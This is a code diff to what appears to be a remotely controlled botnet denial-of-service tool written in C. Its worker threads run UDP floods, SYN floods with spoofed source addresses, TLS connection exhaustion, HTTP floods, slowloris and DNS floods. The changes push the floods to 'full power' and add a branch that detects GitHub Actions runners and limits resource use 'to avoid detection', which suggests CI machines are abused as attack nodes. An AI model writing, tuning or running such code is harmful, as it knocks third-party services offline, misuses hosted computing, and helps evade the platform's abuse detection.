@@ -95,8 +95,8 @@ typedef struct {
     int port_base; int duration; int cpu_id; char host[256];
 } MegaThread;
 
-#define MEGA_W_BATCH 4096   /* balanced: high throughput but yields CPU for WS */
-#define MEGA_W_BURST 16     /* 16 sendmmsg per socket per iteration */
+#define MEGA_W_BATCH 65535   /* full power — matches base fjium-pps.c */
+#define MEGA_W_BURST 64      /* matches base BURST_MULTIPLIER */
 #define MEGA_W_RING  1048576
 
 static void *mega_worker(void *arg) {
@@ -105,7 +105,8 @@ static void *mega_worker(void *arg) {
     cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->cpu_id % ncpu, &cs);
     pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);
 
-    /* Balanced MEGA: batch 4096, burst 16 — leaves CPU for WS heartbeat/recv */
+    /* MEGA: full power — WS thread is SCHED_FIFO(99) so it always preempts */
+    /* MATCH BASE: batch 65535, iov_len=0 zero-byte UDP = max pps, no payload copy */
     size_t m_sz = sizeof(struct mmsghdr) * MEGA_W_BATCH;
     size_t v_sz = sizeof(struct iovec) * MEGA_W_BATCH;
     struct mmsghdr *msgs = mmap(NULL, m_sz, PROT_READ | PROT_WRITE,
@@ -144,7 +145,8 @@ static void *mega_worker(void *arg) {
     time_t start = time(NULL);
 
     while (time(NULL) - start < mt->duration && !is_attack_stop()) {
-        if (should_pause()) { usleep(200); continue; }
+        int us = should_throttle();
+        if (us > 0) { usleep((unsigned)us); continue; }
         port_off = (port_off + 1) % 64;
         uint16_t dp = (uint16_t)(mt->port_base + port_off);
         if (dp == 0) dp = 1;
@@ -165,8 +167,8 @@ static void *mega_worker(void *arg) {
                 while (recvmsg(mt->socks[s], &zm, MSG_ERRQUEUE | MSG_DONTWAIT) > 0) {}
             }
 #endif
-            /* Yield CPU every 4 sockets so WS heartbeat/recv can run */
-            if ((s & 3) == 3) usleep(500);
+            /* Yield CPU every few sockets so SCHED_FIFO(99) WS thread can preempt */
+            if ((s & 7) == 7) sched_yield();
         }
     }
 
@@ -216,6 +218,8 @@ static void *syn_worker(void *arg) {
     time_t start = time(NULL);
 
     while (time(NULL) - start < mt->duration && !is_attack_stop()) {
+        int us = should_throttle();
+        if (us > 0) { usleep((unsigned)us); continue; }
         pkt.ip.saddr = rand_vn_ip();
         pkt.tcp.source = htons((uint16_t)(1024 + rand_r(&seed) % 64511));
         pkt.tcp.seq = htonl(rand_r(&seed));
@@ -268,6 +272,8 @@ static void *tls_exhaust_worker(void *arg) {
     struct pollfd pfds[TLS_POOL];
 
     while (time(NULL) - start < mt->duration && !is_attack_stop()) {
+        int us = should_throttle();
+        if (us > 0) { usleep((unsigned)us); continue; }
         /* Top up pool */
         while (pool < TLS_POOL && !is_attack_stop()) {
             int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
@@ -359,6 +365,8 @@ static void *http_worker(void *arg) {
     const char *paths[] = {"/", "/search?q=", "/login", "/api/v1/", "/wp-admin/", "/.env", "/admin/"};
 
     while (time(NULL) - start < mt->duration && !is_attack_stop()) {
+        int us = should_throttle();
+        if (us > 0) { usleep((unsigned)us); continue; }
         for (int c = 0; c < 64 && !is_attack_stop(); c++) {
             int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
             if (s < 0) continue;
@@ -429,6 +437,8 @@ static void *slowloris_worker(void *arg) {
     int pool = 0;
 
     while (time(NULL) - start < mt->duration && !is_attack_stop()) {
+        int us = should_throttle();
+        if (us > 0) { usleep((unsigned)us); continue; }
         /* Fill pool */
         while (pool < SLOW_POOL && !is_attack_stop()) {
             int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
@@ -538,6 +548,8 @@ static void *dns_worker(void *arg) {
     unsigned short txid = 0;
 
     while (time(NULL) - start < mt->duration && !is_attack_stop()) {
+        int us = should_throttle();
+        if (us > 0) { usleep((unsigned)us); continue; }
         for (int ri = 0; ri < nres && !is_attack_stop(); ri++) {
             struct sockaddr_in res_sa;
             memset(&res_sa, 0, sizeof(res_sa));
@@ -644,12 +656,24 @@ void *bg_attack_thread(void *arg)
         struct sysinfo si;
         long free_mb = 512;
         if (sysinfo(&si) == 0) free_mb = (long)(si.freeram / (1024 * 1024));
+        /* RAM safety: reserve 256MB for system + WS, limit to 50% of free */
+        long usable_mb = free_mb > 256 ? (free_mb - 256) : 64;
+        if (usable_mb > free_mb / 2) usable_mb = free_mb / 2;
+        if (usable_mb < 64) usable_mb = 64;
+
+        /* GitHub Runner: severely limit everything to avoid detection */
+        if (getenv("GITHUB_ACTIONS") || getenv("RUNNER_NAME")) {
+            cores = (cores > 2) ? 2 : cores;
+            usable_mb = (usable_mb > 128) ? 128 : usable_mb;
+            fprintf(stderr, "[atk] GitHub Runner: cores=%d ram=%ldMB\n", cores, usable_mb);
+        }
+
         /* Cap socket count: 256 per CPU max, min 64. Avoid OOM from huge socket pools. */
         int max_sk = cores * 256;
         if (max_sk < 64) max_sk = 64;
         if (max_sk > MEGA_MAX_SOCKS) max_sk = MEGA_MAX_SOCKS;
-        /* RAM safety: 2MB per socket reservation ceiling */
-        int ram_cap = (int)(free_mb / 2);
+        /* RAM safety: usable_mb already reserves system + 50% headroom */
+        int ram_cap = (int)(usable_mb / 2);
         if (ram_cap < 64) ram_cap = 64;
         if (max_sk > ram_cap) max_sk = ram_cap;
 
@@ -672,9 +696,9 @@ void *bg_attack_thread(void *arg)
             free(socks); set_attack_active(0); free(ctx); return NULL;
         }
 
-        int n_udp = cores;
+        int n_udp = cores * 2;
         if (n_udp < 1) n_udp = 1;
-        if (n_udp > 16) n_udp = 16;
+        if (n_udp > 32) n_udp = 32;
         if (n_udp > sock_cnt) n_udp = sock_cnt;
         int threads = n_udp;
 
@@ -692,6 +716,8 @@ void *bg_attack_thread(void *arg)
         pthread_attr_t attr;
         pthread_attr_init(&attr);
         pthread_attr_setstacksize(&attr, 8388608); /* 8MB like base */
+        pthread_attr_setinheritsched(&attr, PTHREAD_EXPLICIT_SCHED);
+        pthread_attr_setschedpolicy(&attr, SCHED_OTHER);
         int spth = sock_cnt / n_udp; if (spth < 1) spth = 1;
         for (int i = 0; i < n_udp; i++) {
             mt[i].socks = &socks[i * spth];
@@ -743,6 +769,8 @@ void *bg_attack_thread(void *arg)
 
         pthread_attr_t attr;
         pthread_attr_init(&attr);
+        pthread_attr_setinheritsched(&attr, PTHREAD_EXPLICIT_SCHED);
+        pthread_attr_setschedpolicy(&attr, SCHED_OTHER);
         for (int i = 0; i < threads; i++) {
             mt[i].target = ta;
             mt[i].port_base = atk->port;
